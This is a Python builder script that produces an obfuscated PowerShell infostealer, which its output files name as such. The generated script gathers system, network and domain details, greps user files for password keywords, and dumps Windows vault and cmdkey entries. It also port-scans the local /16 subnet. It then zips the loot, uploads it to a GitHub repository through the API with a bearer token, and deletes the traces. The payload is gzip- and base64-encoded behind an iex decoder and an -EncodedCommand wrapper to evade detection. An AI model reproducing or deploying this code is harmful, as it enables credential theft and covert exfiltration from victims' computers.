import gzip
import base64

# Corrected and minified PowerShell script

minified_script = (
    'function Get-SystemInfo{$out=Get-ComputerInfo|Select-Object CsName,OsName,OsArchitecture,WindowsVersion;$out|Out-File "$env:TEMP\\info_system.txt"};'
    'function Get-NetworkInfo{ipconfig|Out-File "$env:TEMP\\info_network.txt";hostname|Out-File -Append "$env:TEMP\\info_network.txt";whoami /fqdn|Out-File -Append "$env:TEMP\\info_network.txt"};'
    'function Get-DomainInfo{try{nltest /dsgetdc:|Out-File "$env:TEMP\\info_domain.txt";gpresult /R|Out-File -Append "$env:TEMP\\info_domain.txt"}catch{}};'
    'function Get-UserGroups{whoami /groups|Out-File "$env:TEMP\\groups_users.txt";net localgroup|Out-File -Append "$env:TEMP\\groups_users.txt"};'
    'function Find-Dumps{Get-ChildItem -Path C:\\ -Include *.dmp,*.bin -Recurse -ErrorAction SilentlyContinue|Select-Object FullName|Out-File "$env:TEMP\\dumps_localized.txt"};'
    'function Search-Credentials{Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.log -Recurse -ErrorAction SilentlyContinue|Select-String -Pattern "senha","senhas","password","pass","passwords","login","logins","credenciais","credencial","credentials","credential","locked","lock"|Out-File "$env:TEMP\\possible_credentials.txt"};'
    'function Get-VaultCreds{vaultcmd /list|Out-File "$env:TEMP\\vault.txt";cmdkey /list|Out-File -Append "$env:TEMP\\vault.txt"};'
    'function Get-RecentFiles{Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Recent"|Select-Object Name,LastWriteTime|Out-File "$env:TEMP\\recents_files.txt"};'
    'function Scan-NetworkParallel{$ip=(Get-NetIPConfiguration|Where-Object{$_.IPv4DefaultGateway -ne $null -and $_.IPv4Address.IPAddress -notlike "169.*"}|Select-Object -First 1).IPv4Address.IPAddress;if(-not $ip){return};$base=($ip -replace "\\.\\d+\\.\\d+$","");$ports=@(80,443,445,3389);$results=[System.Collections.Concurrent.ConcurrentBag[string]]::new();$max=50;$pool=[runspacefactory]::CreateRunspacePool(1,$max);$pool.Open();$runs=@();foreach($i in 0..255){foreach($j in 1..254){$target="$base.$i.$j";$ps=[powershell]::Create();$ps.RunspacePool=$pool;$ps.AddScript({param($t,$p,$r)foreach($port in $p){try{$c=New-Object System.Net.Sockets.TcpClient;$a=$c.BeginConnect($t,$port,$null,$null);$w=$a.AsyncWaitHandle.WaitOne(100);if($w -and $c.Connected){$r.Add("$t :$port - OPEN");$c.Close()}else{$r.Add("$t :$port - CLOSED")}}catch{$r.Add("$t :$port - ERROR")}}}).AddArgument($target).AddArgument($ports).AddArgument($results);$runs+=[PSCustomObject]@{Pipe=$ps;Status=$ps.BeginInvoke()}}};foreach($r in $runs){$r.Pipe.EndInvoke($r.Status);$r.Pipe.Dispose()};$pool.Close();$pool.Dispose();$results|Out-File "$env:TEMP\\network_scan.txt"};'
    'Get-SystemInfo;Get-NetworkInfo;Scan-NetworkParallel;Get-DomainInfo;Get-UserGroups;Find-Dumps;Search-Credentials;Get-VaultCreds;Get-RecentFiles;'
    '$files=@("$env:TEMP\\info_system.txt","$env:TEMP\\info_network.txt","$env:TEMP\\info_domain.txt","$env:TEMP\\groups_users.txt","$env:TEMP\\dumps_localized.txt","$env:TEMP\\possible_credentials.txt","$env:TEMP\\vault.txt","$env:TEMP\\recents_files.txt","$env:TEMP\\network_scan.txt");'
    '$guid=[guid]::NewGuid().ToString();$zip="$env:TEMP\\$guid.zip";Compress-Archive -Path $files -DestinationPath $zip -Force;'
    '$Token="<token>";$Owner="HKenzoKimura";$Repo="<repo>";$Path="Coleta/$guid.zip";'
    '$Headers=@{"Authorization"="Bearer $Token";"Accept"="application/vnd.github+json";"X-GitHub-Api-Version"="2022-11-28"};'
    '$bytes=[System.IO.File]::ReadAllBytes($zip);$base64=[Convert]::ToBase64String($bytes);'
    '$Body=@{message="Upload Dump";content=$base64;branch="main";sha=""}|ConvertTo-Json -Depth 10;'
    '$Url="https://api.github.com/repos/$Owner/$Repo/contents/$Path";Invoke-RestMethod -Method PUT -Uri $Url -Headers $Headers -Body $Body;'
    'Remove-Item "$env:TEMP\\info_system.txt","$env:TEMP\\info_network.txt","$env:TEMP\\info_domain.txt","$env:TEMP\\groups_users.txt","$env:TEMP\\dumps_localized.txt","$env:TEMP\\possible_credentials.txt","$env:TEMP\\vault.txt","$env:TEMP\\recents_files.txt","$env:TEMP\\network_scan.txt","$zip" -Force -ErrorAction SilentlyContinue'
)


# Compress and encode
compressed = gzip.compress(minified_script.encode('utf-8'))
encoded = base64.b64encode(compressed).decode('utf-8')

# Generate PowerShell decoder
powershell_decoder = f"""
$base64 = '{encoded}'
$bytes = [System.Convert]::FromBase64String($base64)
$stream = New-Object IO.MemoryStream(, $bytes)
$gzip = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress)
$reader = New-Object IO.StreamReader($gzip)
$command = $reader.ReadToEnd()
iex $command
"""

# Encode for -EncodedCommand
utf16_bytes = powershell_decoder.encode('utf-16le')
encoded_command = base64.b64encode(utf16_bytes).decode('utf-8')

# Save outputs
with open("C:\\InfoStealer\\infostealer_minified.ps1", "w", encoding="utf-8") as f:
    f.write(powershell_decoder)

with open("C:\\InfoStealer\\encoded_command_infostealer.txt", "w", encoding="utf-8") as f:
    f.write(encoded_command)

print("Scripts 'infostealer_minified.ps1' e 'encoded_command_infostealer.txt' gerados com sucesso.")
